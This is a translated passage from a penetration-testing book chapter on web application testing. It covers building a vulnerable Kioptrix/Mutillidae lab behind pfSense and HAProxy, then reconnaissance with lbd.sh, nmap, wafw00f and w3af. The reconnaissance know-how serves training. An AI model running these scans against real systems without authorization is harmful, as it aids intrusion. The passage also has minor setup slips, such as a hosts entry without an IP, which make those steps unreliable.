# 第五章。Web 应用程序利用

在本章中，我们将探讨使用免费工具（如您的网络浏览器、w3af、WebScarab 等）测试 Web 应用程序的各种方法。我们还将讨论绕过 Web 应用程序防火墙和入侵检测系统的方法，以及如何确定目标是否正在进行负载平衡或过滤。本章需要进行大量的实验室准备。如果您不跟着示例进行操作，您可能希望跳过这些部分。

需要注意的是，在安全环境中，基于 Web 的应用程序可能是获得您正在测试的网络中的立足点的最直接方法。它们也是恶意用户最有可能使用的入口点。似乎每天都有更多的违规通知发布，其中大多数源于 Web 应用程序安全漏洞或配置错误。考虑到这些应用程序中的许多是通过互联网对公众开放的，因此 Web 应用程序是主要目标。互联网仍然提供各种匿名方法，从而限制了潜在攻击者面临的实际风险。毕竟，很难起诉你无法抓住的人。

### 注意

有许多种方法可以进行这种类型的测试。我们需要专门撰写一本书来覆盖所有方法。考虑到这一点，我们提供了有关在针对安全环境时提供最大利益的技术指导。

企业在决定安全预算应该花在哪里时通常会采用基于风险的方法，而在时间和预算限制下做出的决定有时会导致意外的错误，对整个环境的安全姿态产生深远影响。渗透测试人员必须能够模仿客户在野外可能面临的攻击类型，并提供有关如何减轻发现的漏洞的准确信息。有时这些应用甚至会让攻击者轻松绕过所有已经存在的安全控制。企业不仅面临失去关键信息的风险，而且在保护架构的其他方面上花费的所有资金都将被彻底浪费。

与其他章节一样，我们首先快速回顾我们选择的工具的基础知识，然后转向一些更有趣的技术。

# 熟能生巧

渗透测试需要使用需要时间和实践来完善的技能。为了鼓励吸收本章的材料，我们将在我们的实验室中添加一个负载平衡的有意漏洞的 Linux 发行版实例。我们还将使用我们的 Ubuntu 虚拟机来托管 Mutillidae 2.1.7（提供给社区的[`www.irongeek.com`](http://www.irongeek.com)），这是一个具有故意安全漏洞的基于 Web 的应用程序，我们将利用这些漏洞。

如果您已经阅读了本书的各章节，您应该已经熟悉了 Kioptrix Level 1。现在我们将转向更高级的 Kioptrix 发行版，由 Steven McElrea（又名 loneferret）和 Richard Dinelle（又名 haken29a）的[www.kioptrix.com](http://www.kioptrix.com)团队提供给社区。

为了跟随本章的示例，虚拟实验室需要配置如下：

+   **BackTrack Linux：**连接到内部网络`VLAN1`

+   **Kioptrix VM Level 3：**连接到内部网络`VLAN1`

+   **Kioptrix VM Level 3 Clone：**连接到内部网络`VLAN1`

+   **Ubuntu_TestMachine_1**已安装 Mutillidae：连接到`VLAN1`

+   **PFSense VM：**连接到内部网络`VLAN1`。这将为我们的负载平衡提供支持

我们将演示安装 Kioptrix 3、创建 VM 克隆、在 Ubuntu 上安装 Mutillidae，并为我们当前的需求准备 PfSense。

### 注意

VLAN1 网络连接可以通过在 Oracle VM 管理器的网络设置中简单地选择内部网络来创建。PfSense 将用于为客户机 IP 地址提供 DHCP 服务器。

请查看抽象网络图：

![熟能生巧](img/7744_05_01.jpg)

## 安装 Kioptrix Level 3

学习最有效的方法之一是进行实践。Kioptrix Level 3 是由 loneferret（Steven McElrea）和 haken29a（Richard Dinelle）免费提供给社区的，旨在提供一个基本平台，用于获得这种经验。这个特定的发行版为我们提供了一个包含多个 Web 应用程序安全漏洞的平台，我们将利用这些漏洞来探索各种实践的 Web 应用程序利用方法。

前往[`www.kioptrix.com`](http://www.kioptrix.com)网站，选择您喜欢的语言，然后点击页面右侧的**Kioptrix VM Level 1.2**链接。

![安装 Kioptrix Level 3](img/7744_05_02.jpg)

您需要将文件提取到所选位置。此时，这个过程应该是熟悉的。打开 Oracle VirtualBox 并使用以下定义的设置创建一个新的虚拟机：

+   名称：Kioptrix VM Level 3

+   操作系统类型：其他 Linux

+   内存：256

+   启动磁盘：Kioptrix Level 3.vmdk（正常，3.00 GB）

要使用现有的 Kioptrix 机器，您需要选择：如下截图所示的**使用现有硬盘**选项：

![安装 Kioptrix Level 3](img/7744_05_03.jpg)

需要将新的 Kioptrix 系统添加到 Oracle VirtualBox 的**网络设置**部分，以确保该系统与 BackTrack 虚拟机共享相同的受限网络。两者都应设置为使用`VLAN1`。

### 注意

如果在启动 Kioptrix Level 3 虚拟机时遇到错误，请编辑**虚拟机**设置，并在**系统-主板**中启用 IO APIC 设置。处理器设置下的 PAE/NX 也可能需要启用。

![安装 Kioptrix Level 3](img/7744_05_04.jpg)

Kioptrix Level 3 可以通过各种方式来解决，因为这个发行版旨在帮助初学者学习渗透测试概念。我们能够专注于用于利用机器的方法论，而不是浪费时间试图突破旨在误导或混淆攻击者的安全机制，这些安全机制可能在真正的渗透测试中遇到。

## 创建 Kioptrix VM Level 3 克隆

我们将使用虚拟负载均衡器来确保我们准确模拟最有可能在安全环境中找到的技术类型。为此，我们需要创建另一个 Kioptrix VM 的实例。您可以轻松地按照之前概述的步骤来完成此任务，或者您可以利用 Oracle VirtualBox Manager 中包含的克隆功能。

要克隆虚拟客户机，请执行以下步骤：

1.  打开**Oracle VM VirtualBox Manager**。

1.  如果需要，关闭要克隆的机器。

1.  右键单击 Kioptrix VM Level 3 虚拟机，然后选择**克隆**选项。

1.  勾选**重新初始化所有网络卡的 MAC 地址**选项。![创建 Kioptrix VM Level 3 克隆](img/7744_05_05.jpg)

1.  点击**下一步**。

1.  选择**完全克隆**单选按钮。

1.  点击**克隆**完成该过程。

通过选择重新初始化所有系统的 MAC 地址，我们确保将来避免网络冲突。

**完成完整的实验设置后，请注意以下事项：**

您需要将目标机器（使用 DHCP）的 IP 信息添加到 BackTrack 测试器 1 实例中。允许目标机器（Kioptrix）启动并获取 IP 地址。快速扫描您的虚拟网络，找到 Kioptrix 实例的分配 IP 地址，并将其添加到 BackTrack 的主机文件中。

## 在 Ubuntu 虚拟机上安装和配置 Mutillidae 2.1.7

Mutillidae 是由 Adrian "Irongeek" Crenshaw 和 Jeremy Druin 创建的一组脚本，故意对 OWASP 前 10 名进行了漏洞测试。有关发布的详细信息，请访问：[`www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10`](http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10)。

我们将使用这些脚本来练习一些您应该熟悉的技术，以便在受保护的环境中进行渗透测试的挑战。

### 注意

如果需要练习，您还可以利用 Mutillidae 在分发的每个级别中包含的提示来增强对 Web 应用程序测试的信心。

正如我们之前提到的，Web 应用程序是一个非常好的目标，通常由于各种原因，包括计划外的软件更新、缺乏良好的编码实践等，往往会发现它们是不安全的。

1.  首先，我们需要配置您的**Ubuntu_TestMachine_1**以使用两个网络适配器，一个用于 NAT，一个用于内部网络 VLAN1。这个过程现在应该很熟悉了，所以我们将不再回顾执行此任务所需的步骤。

1.  启动**Ubuntu_TestMachine_1**，并验证与互联网的连接。现在是抓取所需的任何软件更新的最佳时机。

1.  前往：[`www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10`](http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10)，并从 Adrian Crenshaw（Irongeek）的网站上下载 Mutillidae 2.1.7 的副本。Mutillidae 的开发人员努力为社区提供了一个有效的分发，以测试我们的技能对抗 OWASP 前 10 名。

### 提示

[www.irongeek.com](http://www.irongeek.com)网站充满了精彩的信息；我强烈建议您抽出时间查看 IronGeek 收集或创建并提供给社区的一些渗透测试信息！

1.  打开控制台窗口，切换到`Downloads/`目录。

```
# cd Downloads/ 

```

1.  解压缩`mutillidae-2.1.7.zip`文件：

```
# unzip mutillidae-2.1.7.zip 

```

1.  将`mutillidae`文件夹复制到`/var/www`目录：

```
# sudo cp -r mutillidae /var/www/ 

```

1.  现在我们需要配置数据库连接，以便 mutillidae 正常运行。我们需要更改`config.inc`文件以反映我们为 root 设置了 MySQL 密码。将`1EasyPassword`替换为您的 MySQL root 密码。

### 注意

您还记得您在第三章中使用的 MySQL root 密码吗，*枚举：明智地选择您的目标*？如果不记得，那么您可能能够理解现实世界中为什么有这么多管理员重复使用密码的原因！在拥有许多机器的大型环境中，正确的密码管理至关重要。有一些可用的工具可以用来提供一次性密码以及其他改进身份验证方法的机制。

```
# sudo nano /var/www/mutillidae/config.inc
$dbpass = '1EasyPassword';

```

1.  使用*CTRL + O*和*Enter*，然后使用*CTRL + X*保存文件并返回到命令行。

1.  在 Ubuntu 中打开 Firefox 浏览器，浏览到`http://localhost/mutillidae`。

1.  单击顶部导航栏中的**设置/重置 DB**链接。![在 Ubuntu 虚拟机上安装和配置 Mutillidae 2.1.7](img/7744_05_06.jpg)

就是这样！现在我们需要重新启动机器并**禁用 NAT 连接**，以便它无法通过互联网访问。这些页面**不应**向互联网上的恶意用户提供。

## 安装和配置 pfSense

pfSense 是一个基于 FreeBSD 的虚拟防火墙和路由器的免费实现。它非常灵活，是各种应用的理想选择，包括建立虚拟实验室进行渗透测试。pfSense 提供的远不止简单的防火墙功能。由于它易于安装和配置，使得 pfSense 非常适合我们的目的；毕竟，我们现在正在努力保持简单，以便我们可以专注于渗透测试的重要方面，而不是冗长的讨论复杂虚拟路由器和交换机的正确配置。

## 为 pfSense 准备虚拟机

1.  pfSense 必须作为虚拟客户机下载和安装。在进行下一步之前，请下载分发。pfSense 下载镜像的链接位于：[`www.pfsense.org/mirror.php?section=downloads`](http://www.pfsense.org/mirror.php?section=downloads)。

1.  选择靠近您物理位置的镜像以提高下载速度。

1.  下载适当的发行版到您选择的位置。在本章的示例中，我们将使用`pfSense-2.0-RELEASE-i386.iso.gz`。

1.  验证下载的 MD5，然后解压到所选位置。

1.  打开“Oracle VM VirtualBox Manager”，选择“新建”图标，然后单击“下一步”。

1.  键入 pfSense VLAN1，并使用下拉菜单选择**BSD**作为**操作系统**和**FreeBSD**作为**版本**，然后单击“下一步”。![为 pfSense 准备虚拟机](img/7744_05_07.jpg)

1.  如果系统资源可用，选择 256 MB 的 RAM。最低要求建议您至少使用 128 MB。准备好后，单击“下一步”。

1.  为了安装 pfSense，我们需要创建一个新的硬盘。我们将使用 6 GB 进行安装。此设置可以低至 2 GB 并且仍然有效，但您将受到扩展 pfSense 功能的限制。在选择**创建新硬盘**径向选项后，单击“下一步”。

1.  选择**VDI（虚拟磁盘映像）**，然后单击“下一步”。

1.  选择：**动态分配**虚拟磁盘文件，然后单击“下一步”。

1.  如果您的机器上的磁盘空间不紧张，请至少选择**6 GB**。这将以 2 GB 的块动态分配，但现在设置较大的大小要比以后更改更容易。单击“下一步”。

1.  确保您的设置与以下设置类似，并单击“创建”按钮以完成创建 pfSense 虚拟机。![为 pfSense 准备虚拟机](img/7744_05_08.jpg)

1.  右键单击 pfSense VLAN1 实例，选择“设置”。我们需要为这台虚拟机启用两个网络设备。将网络适配器 1 分配给内部网络**WLAN1**，将网络适配器 2 分配给**VLAN1**。如果以前没有使用过内部网络名称，您可能需要手动输入。从下拉菜单中选择**PCNet-PCI II**适配器（在**高级**菜单下的两个接口下）以避免与 FreeBSD 和 VirtualBox 相关的网络问题。

1.  在单击**OK**并关闭窗口之前，从**混杂模式**下拉菜单中选择**允许 VMs**。

1.  在 Oracle VM VirtualBox 管理器中选择**PFSense VLAN1**，然后单击**启动**图标。

1.  在弹出的**首次运行向导**屏幕上单击“下一步”。

1.  单击屏幕右侧的图标，浏览到您下载并提取`PFSense.iso`的位置，选择它，然后单击“打开”。

1.  单击“下一步”。

## pfSense 虚拟机持久性

如果我们不想每次加载 pfSense 虚拟机时都手动重新配置它，我们需要在专用虚拟硬盘上执行完整安装。以下步骤将引导您完成必要的过程：

1.  单击“启动”，这将开始 pfSense 虚拟机的引导序列。

1.  按*1*继续引导。

1.  按*I*继续安装。在适当的时候按顺序使用以下设置：

+   接受这些设置

+   快速/简易安装

+   好的

+   对称多处理内核（多个处理器）

+   重新启动

### 注意

为了避免安装介质在下次重启时启动，可能需要通过选择**设备 | CD/DVD 设备**并在菜单中取消选中`pfsense.iso`来“弹出”安装介质。

1.  系统重新启动后，系统将询问您是否要立即设置 VLAN。输入*y*并按*Enter*继续。

1.  在**输入新 VLAN 的父接口名称**提示处输入`le0`并按*Enter*。

1.  在**输入 VLAN 标记**处输入*1*。

1.  在**输入新 VLAN 的父接口名称**提示处，输入`le1`并按*Enter*。

1.  在**输入 VLAN 标记**处输入*2*。

1.  按*Enter*。

1.  在**输入 WAN 接口**提示处，输入**WLAN1**接口。您可以查看 VirtualBox 中的设置，找出哪个网络适配器 MAC 地址是 WLAN 适配器。作为示例，我们将使用：`le0`并按*Enter*。

1.  按*Enter*，并选择适当的适配器用于 LAN（在我的情况下选择 VLAN1 适配器，`le1`）。

1.  继续按*Enter*，然后在提示时按*y*继续。![pfSense 虚拟机持久性](img/7744_05_09.jpg)

恭喜，您的实验室设置几乎完成了！在我们开始本章更有趣的部分之前，还有一些额外的设置需要配置。此时，您应该看到类似以下的屏幕：

![pfSense 虚拟机持久性](img/7744_05_10.jpg)

## 配置 pfSense DHCP 服务器

在开始之前，我们需要设置内置的 DHCP 服务器，以便我们的其他机器可以在 VLAN1 接口上获取地址，而无需手动配置。使用 pfSense 来管理 DHCP 连接比起简单使用 VirtualBox 提供的内置功能，能够提供更多的控制。

1.  从 pfSense 控制台中选择**2)设置接口 IP 地址**。

1.  在**输入您要配置的接口的编号：**提示处，我们需要输入*2*选择 LAN 接口，并按*Enter*。

1.  在提示时输入以下 IP 地址：`192.168.75.1`并按*Enter*。

1.  在**输入新 LAN IPv4 子网位数**提示处输入`24`并按*Enter*。

1.  当询问是否要在 LAN 上启用 DHCP 服务器时，输入*y*。按*Enter*继续。![配置 pfSense DHCP 服务器](img/7744_05_11.jpg)

1.  当要求提供起始地址范围时，输入`192.168.75.10`并按*Enter*。

1.  您将被要求选择结束的 DHCP 范围。输入`192.168.75.50`并按*Enter*。![配置 pfSense DHCP 服务器](img/7744_05_12.jpg)

## 启动虚拟实验室

每次加载测试网络时，系统应按以下顺序启动：

1.  pfSense VLAN1

1.  BackTrack

1.  Kioptrix VM Level 3

1.  Kioptrix VM Level 3 Clone

1.  Ubuntu_TestMachine_1

### 提示

请记住，在 BackTrack 或 Ubuntu 中，您可以随时使用`dhclient`命令行命令释放和更新 IP 地址。之后使用`ifconfig`检查地址，以确保 DHCP 服务器正常工作。

如果您遇到机器从错误的 DHCP 服务器获取 IP 的问题，您还需要关闭我们在前几章中启用的 VirtualBox DHCP 服务器。有关 VirtualBox 更高级功能的详细说明可以在互联网上找到：[`www.virtualbox.org/manual/ch08.html`](http://www.virtualbox.org/manual/ch08.html)。

## pfSense DHCP — 永久预留

现在我们可以登录到虚拟 pfSense 防火墙的 Web 控制台，为两台 Kioptrix 机器设置静态 IP。

打开预装在 BackTrack 中的 Firefox Web 浏览器，转到`http://192.168.75.1`，这是 pfSense 虚拟机的 Web 控制台界面。如果一切配置正确，系统将要求您输入用户名和密码。

+   **用户名：**`admin`

+   **密码：**`pfsense`

### 注意

如果您在设置机器时遵循了标准最佳实践，您可能已经更改了 pfSense 实例的默认密码。如果是这种情况，请使用该密码而不是默认密码，并为积极主动表示赞赏！

pfSense 仪表板提供了大量的数据。现在我们只关注设置负载平衡。按照以下步骤允许 pfSense 为两台 Kioptrix 客户机负载平衡 Web 应用程序。

1.  首先，我们需要知道哪些 MAC 地址属于每台 Kioptrix 机器，以便我们可以设置静态租约。这可以通过检查每个框的 VirtualBox Manager 设置并查看**网络设置**来完成。

1.  在 pfSense Web 控制台中，单击**状态|DHCP 租约**以获取当前租约列表。将 IP 地址与每台 Kioptrix 机器的 MAC 地址进行匹配。

1.  通过使用右侧的按钮打开静态分配窗口，为两台机器设置静态 IP 地址分配。![pfSense DHCP — Permanent reservations](img/7744_05_13.jpg)

1.  在**服务：DHCP：编辑静态映射**窗口中，您需要输入一个在 DHCP 范围之外的 IP 地址。这将确保每次机器连接时都会收到相同的 IP 地址。在 IP 地址字段中输入`192.168.75.102`。![pfSense DHCP — Permanent reservations](img/7744_05_14.jpg)

1.  在**主机名**中输入**Kioptrix2**。

1.  输入您选择的描述。这将存储在 DHCP 设置中，以便将来进行审查。

### 注意

作为渗透测试人员，值得注意的是，有时管理员会在其 DHCP 列表中输入非常好的注释。如果您碰巧接管了充当 DHCP 服务器的系统，这将使您更容易找到网络上有价值的机器。

1.  单击**保存**以完成任务。

1.  应用设置。向下滚动以查看静态 DHCP 地址。此列表包括有关所有分配的 IP 地址的信息。![pfSense DHCP — Permanent reservations](img/7744_05_15.jpg)

## 安装 HAProxy 进行负载平衡

为了练习检测负载均衡器，我们需要在我们的虚拟实验室中设置一个。我们可以使用我们现有的 Ubuntu 机器来完成这项任务。

### 注意

如果在运行 HAProxy 时遇到困难，请确保验证您已关闭之前章节中的 Apache 安装。如果端口已被 Apache 或其他任何东西绑定，您将无法在同一端口上设置负载平衡。

1.  在您的 Ubuntu 虚拟机上启用 NAT 设置并启动它。

1.  在虚拟机上启用**网络适配器 2**。确保它使用 VLAN1。为您的 Ubuntu 机器设置一个静态 DHCP 租约。使用`192.168.75.200`作为 IP 地址。在控制台中使用`dhclient`刷新您的 IP 地址信息。验证您现在的一个适配器正在使用`192.168.75.200`。

1.  单击左上导航栏中的**应用程序|Ubuntu 软件中心**。

1.  在**Ubuntu 软件中心**屏幕的左上角的搜索字段中键入`HAProxy`。

1.  点击**安装**按钮，并在提示时输入密码。

### 注意

如果您在安装过程中遇到与不受信任的软件包相关的错误，可以运行`apt-get update`和`apt-get upgrade`来继续安装。

1.  我们需要编辑配置文件以为我们的两台 Kioptrix 机器设置负载均衡器。打开终端会话并编辑`/etc/haproxy/haproxy.cfg`文件。记得使用`sudo`提升权限以进行写访问。然后从该目录中删除所有其他`.cfg`文件。

```
# sudo nano /etc/haproxy/haproxy.cfg 

```

+   在保存并退出之前，您的文件应该与以下内容匹配：![Installing HAProxy for load balancing](img/7744_05_16.jpg)

1.  我们的 Ubuntu 机器已经运行了一个 Web 服务器，所以我们必须禁用它才能使这个练习正常工作：

```
# sudo /etc/init.d/apache2 stop 

```

1.  是时候启动负载均衡器了：

```
# sudo haproxy -f /etc/haproxy/haproxy.conf 

```

如果一切配置正确，您将发现现在可以使用 IP 地址`192.168.75.200`浏览到您的 Kioptrix 机器。

## 将 Kioptrix3.com 添加到主机文件

让我们在 BackTrack 上的 hosts 文件中添加`Kioptrix3.com`，并尝试侦测正在访问哪台机器。在 BackTrack 终端中，切换到`/etc`目录，用你选择的编辑器打开`hosts`文件，并添加以下内容到文件中：

```
kioptrix3.com

```

通过 ping `kioptrix3.com`来验证连接：

```
# ping kioptrix3.com 

```

```
PING kioptrix3.com (192.168.75.200) 56(84) bytes of data.
64 bytes from kioptrix3.com (192.168.75.200): icmp_seq=1 ttl=64 time=3.76 ms

```

# 检测负载均衡器

在进行渗透测试时，有可能一个服务器上留下的漏洞在另一个服务器上是不可用的。适当的负载均衡几乎是完全透明的，这可能很容易导致测试结果的误传，如果您在负载均衡池中的任何服务器上发现了任何服务器问题。

### 提示

我们专注于 HTTP 负载均衡的练习。检测 DNS 负载均衡可以通过使用前一章描述的枚举工具来完成。例如，您可以使用 dig 来查看是否为同一域名返回了多个服务器。

## 快速现实检查 —— 负载均衡检测器

BackTrack 5 包括一个名为负载均衡检测器（lbd.sh）的脚本，它将快速测试负载均衡。运行这个工具对我们当前的负载均衡`Kioptrix3.com`服务器将为您提供输入，表明服务器没有负载均衡，因为该工具从未有机会看到其他服务器。

然而，如果您在 Ubuntu 机器上编辑 HAProxy 配置以使用轮询平衡类型（平衡`roundrobin`）并重新启动，以下命令将找到您的负载均衡器：

```
# cd /pentest/enumeration/web/lbd
# ./lbd.sh kioptrix3.com

```

```
lbd - load balancing detector 0.2 - Checks if a given domain uses load-balancing.
Written by Stefan Behte (http://ge.mine.nu)
Proof-of-concept! Might give false positives.
Checking for DNS-Loadbalancing: NOT FOUND
Checking for HTTP-Loadbalancing [Server]:
Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
NOT FOUND
Checking for HTTP-Loadbalancing [Date]: 02:02:54, 01:44:10, FOUND
Checking for HTTP-Loadbalancing [Diff]: NOT FOUND
kioptrix3.com does Load-balancing. Found via Methods: HTTP[Date] 

```

### 注意

熟悉可以实现的各种负载均衡类型，这样就更容易准确地检测网络的真实情况。

### 那么，我们到底在寻找什么呢？

一个站点可以由许多不同的服务器托管，安全程度也不同。有时只需要其中一个服务器就能完成工作，渗透测试人员需要确保没有遗漏。

正如前面的例子所强调的，有时候不可能确定一个站点是否是负载均衡的。`lbd.sh`给我们提供了一个有趣的事实：它能够通过查看`HTTP[Date]`方法来确定站点是否正在负载均衡。访问的服务器之间的小变化是准确确定的关键。

### 注意

只是在两个正在负载均衡的系统之间进行简单的扫描将强调需要对所有系统进行枚举和测试，而不仅仅是一部分。

当对我们负载均衡池中的服务器运行 nmap 扫描时，我们看到以下结果：

```
# nmap -A -T5 192.168.75.101 

```

```
Host is up (0.00056s latency).
Not shown: 998 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
MAC Address: 08:00:27:56:C4:B2 (Cadmus Computer Systems) 

```

这些信息是预期的。但它与其他 Kioptrix 机器相比如何？

```
# nmap -A -T5 192.168.75.102 

```

```
Nmap scan report for 192.168.75.102
Host is up (0.00055s latency).
Not shown: 998 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
MAC Address: 08:00:27:82:09:5A (Cadmus Computer Systems) 

```

我们看到许多发现与预期相同，但这里有一个小的差异需要查找：`192.168.75.102`的 MAC 地址与`192.168.75.101`的不同。如果这些系统不是彼此的完全克隆，那么其他差异也可能是可见的。这些是我们需要寻找的小差异。

我们的 Web 应用程序由 Kioptrix 机器托管，但由我们的 Ubuntu 机器进行负载均衡。这通常是一个虚拟 IP 地址，严格用于提供对托管我们应用程序的两台生产机器的访问，可能是在分层 DMZ 中。当然，如果应用程序开发人员或管理员在其中一台服务器或应用程序中留下了漏洞，我们将很快能够绕过任何这样的安全措施，直接进入关键的基础设施和数据所在的地方。

### 提示

HTTP 响应标头还可以提供突出显示负载均衡器的信息。使用允许您查看这些标头的工具，您可以确定是否存在这些类型的差异，表明有多台机器提供相同的网页。

# 检测 Web 应用程序防火墙（WAF）

我们需要了解是否还有内联 Web 应用程序防火墙需要我们注意。BackTrack 通过提供 WAFW00F 来满足这一需求，这是一个尝试检测最常用的 Web 应用程序防火墙的工具。这个脚本是由 Sandro Gauci 和 Wendel G. Henrique 创建的，可以从项目网站的下载部分下载[`code.google.com/p/waffit/`](http://code.google.com/p/waffit/)。

使用以下命令从 BackTrack 终端调用命令：

```
# cd /pentest/web/waffit/
# ./wafw00f.py

```

```
^ ^
_ __ _ ____ _ __ _ _ ____
///7/ /.' \ / __////7/ /,' \ ,' \ / __/
| V V // o // _/ | V V // 0 // 0 // _/
|_n_,'/_n_//_/ |_n_,' \_,' \_,'/_/
<
...'
WAFW00F - Web Application Firewall Detection Tool
By Sandro Gauci && Wendel G. Henrique
Usage: wafw00f.py url1 [url2 [url3 ... ]]
example: wafw00f.py http://www.victim.org/
wafw00f.py: error: we need a target site

```

与大多数由辛勤工作的开发人员提供的工具一样，当运行`wafw00f.py`时，没有任何输入变量的语法示例。我们将遵循提供的用法示例语法：

```
# ./wafw00f.py http://kioptrix3.com 

```

```
^ ^
_ __ _ ____ _ __ _ _ ____
///7/ /.' \ / __////7/ /,' \ ,' \ / __/
| V V // o // _/ | V V // 0 // 0 // _/
|_n_,'/_n_//_/ |_n_,' \_,' \_,'/_/
<
...'
WAFW00F - Web Application Firewall Detection Tool
By Sandro Gauci && Wendel G. Henrique
Checking http://kioptrix3.com
Generic Detection results:
No WAF detected by the generic detection 
Number of requests: 10

```

突出显示的响应表明没有找到 WAF。这应该会让我们渗透 Kioptrix 机器的工作变得更容易。那么，如果实际上有 Web 应用程序防火墙，我们应该期望看到什么呢？以下是针对这种配置的结果：

```
^ ^
_ __ _ ____ _ __ _ _ ____
///7/ /.' \ / __////7/ /,' \ ,' \ / __/
| V V // o // _/ | V V // 0 // 0 // _/
|_n_,'/_n_//_/ |_n_,' \_,' \_,'/_/
<
...'
WAFW00F - Web Application Firewall Detection Tool
By Sandro Gauci && Wendel G. Henrique
Checking http://192.168.75.15/mod_security/w3af/
The site http://192.168.75.15/mod_security/w3af/ is behind a ModSecurity
Generic Detection results:
The site http://192.168.75.15/mod_security/w3af/ seems to be behind a WAF
Reason: The server returned a different response code when a string trigged the blacklist. 
Normal response code is "404", while the response code to an attack is "302"
Number of requests: 10

```

正如您所看到的，这些信息清楚地定义了网站正在受到保护的事实，以及在这种情况下它正在使用 ModSecurity（实际上确实是）。在进行测试时，我们应该牢记这一事实，并尝试使用已知可用于测试使用此特定软件的站点的技术。这些策略会随时间而变化，因此在尝试在生产网络上使用漏洞之前，您应该尝试模拟您正在测试的环境。

# 接受第 3 级挑战 — Kioptrix

本章中我们想要涵盖的许多技术可以通过接受 Kioptrix 提供给我们的挑战来探索。让我们看一下获得 Kioptrix 机器 root 权限所需的步骤。

### 提示

打开 BackTrack，查看`Kioptrix3.com`的 Web 应用程序。浏览并查看页面的源代码。在开始之前，有一些有趣的注释和彩蛋留给我们。玩得开心！

通常，我们将从扫描托管 Web 应用程序的服务器开始。这种基础设施测试为我们提供了许多在尝试执行某些 Web 应用程序漏洞时非常有用的信息。在这种情况下，我们知道使用我们的负载平衡检测器，正在进行一些负载平衡。我们还知道这些服务器彼此非常相似，并且没有留下任何线索表明它们的真实 IP 是什么。我们的下一步是检查是否有任何明显的 Web 应用程序防火墙需要我们注意。如果有的话，我们可能需要使用某些规避技术来绕过这些限制。

在现实世界中，由于防火墙限制和网络分割实践，这些系统很可能甚至无法直接访问。我们的目标是能够接管其中一个服务器，然后从该服务器转移到另一个服务器，然后将其关闭。毕竟，如果系统完全相同，我们只需要获取一个的凭据，就可以使用该凭据接管所有副本。

# Web 应用程序攻击和审计框架（w3af）

这个令人难以置信的框架自动化了以前手动完成的许多任务。完全可扩展和开源的 w3af 使用了大量插件，提供了完全可定制的测试体验。该工具的作者创建它是为了对测试新手和专家渗透测试人员都非常友好。如果您需要的插件尚未可用，那么只需自己创建它，可以节省大量时间用于未来的所有测试。w3af 不断更新和改进。w3af 包括的插件类型涵盖了发现、暴力破解、审计甚至规避。该框架还包括自动更新功能，以确保您始终安装并准备运行最新和最好的版本。在[w3af.sourceforge.net](http://w3af.sourceforge.net)了解更多关于这个工具的信息。

正如预期的那样，BackTrack 开发团队预先安装了 w3af。打开您的 BackTrack 虚拟机，然后选择：**应用程序 | BackTrack | 漏洞评估 | Web 应用程序评估 | Web 漏洞扫描程序 | w3af gui**来启动图形用户界面。如果您的 BackTrack 系统连接到互联网，当提示时您将能够更新插件到最新版本。

### 注意

不要选择在 BackTrack 内更新 w3af。在 BackTrack 5 r1 上更新 w3af 后，w3af 将不再起作用。可以采取几个步骤来安装和配置新的依赖项，但这超出了本示例的范围。

![Web 应用程序攻击和审计框架（w3af）](img/7744_05_17.jpg)

通常，您会希望执行非常有选择性的攻击，特别是如果您试图测试客户管理员和安全团队的检测能力。

### 注意

在继续之前，请记得在 Ubuntu 机器上停止 Apache 并启动 HAproxy。

在这种情况下，我们将简单地开始执行**web_infrastructure**扫描，并查看我们可以在`Kioptrix3.com (192.168.75.200)`上找到什么信息。

![Web 应用程序攻击和审计框架（w3af）](img/7744_05_18.jpg)

看起来 w3af 能够检测到这个站点正在进行负载平衡。仔细检查后，您会注意到反向代理可以用于防止已知问题被利用。确保实际测试漏洞（如果在您的参与规则中涵盖），特别是当您发现可能存在 Web 应用程序防火墙或其他缓解控制时。企业将希望确保他们在这些设备或服务器上的支出要么得到了回报，要么它们没有按预期工作。

## 使用 w3af GUI 来节省时间

现在我们将运行一个快速扫描，以确定我们能找到什么。这将需要一些时间，所以请确保留出足够的时间来允许测试完成。

### 注意

建议从提供可立即使用的信息的较小扫描开始，然后进行更彻底的扫描，可能需要数小时甚至数天。渗透测试通常（不幸地）受到预定时间范围的限制。

在测试进行中，您可以在**日志**选项卡下查看更新的日志。有时，甚至可以在扫描过程中审查日志，以便在收到结果后立即采取行动。

让我们回顾一些发现：

![使用 w3af GUI 来节省时间](img/7744_05_19.jpg)

扫描发现了路径泄露、应用程序错误以及服务器允许目录索引的情况。这些信息对确定下一步非常有用。

## 使用 w3af 控制台进行扫描

我们中的许多人更喜欢留在控制台部分，而不是使用 GUI。考虑到这一点，我们将运行另一个扫描，看看是否能找到比简单的目录索引和路径泄露配置更有趣的东西。这次我们将使用控制台而不是 GUI。

### 注意

不要选择从 BackTrack 内部更新 w3af。在 BackTrack 5 r1 上更新 w3af 后，w3af 将不再工作。可以采取几个步骤来安装和配置新的依赖项，但这超出了本示例的范围。

```
# cd /pentest/web/w3af
# ./w3af_console

```

![使用 w3af 控制台进行扫描](img/7744_05_20.jpg)

您可以从 w3af 命令控制台执行所有可用的关键功能。help 命令详细介绍了可用的选项。让我们开始扫描。

